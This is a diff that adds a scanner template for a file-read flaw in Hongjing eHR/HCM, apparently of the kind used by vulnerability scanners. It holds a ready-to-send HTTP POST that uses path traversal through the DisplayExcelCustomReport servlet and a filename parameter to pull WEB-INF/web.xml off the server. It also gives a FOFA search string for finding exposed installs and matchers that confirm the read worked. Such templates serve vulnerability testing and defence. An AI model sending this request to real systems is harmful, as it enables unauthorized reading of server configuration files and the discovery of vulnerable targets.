@@ -1,0 +1,27 @@
+## id: VEID-2024-0307
+## name: 宏景eHR-HCM-DisplayExcelCustomReport接口存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: 景eHR存在任意文件读取漏洞
+## fofa-query: app="HJSOFT-HCM"
+## verification: true
+
+
+POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+filename=../webapps/ROOT/WEB-INF/web.xml
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "<?xml version=" && body contains "<filter>"
+
+
+
+
+
+# @VEIL-STAMP: 137910354f1450ffc6213586693d327e9ef60b2316a8b0d6c60057d03f55a8c1
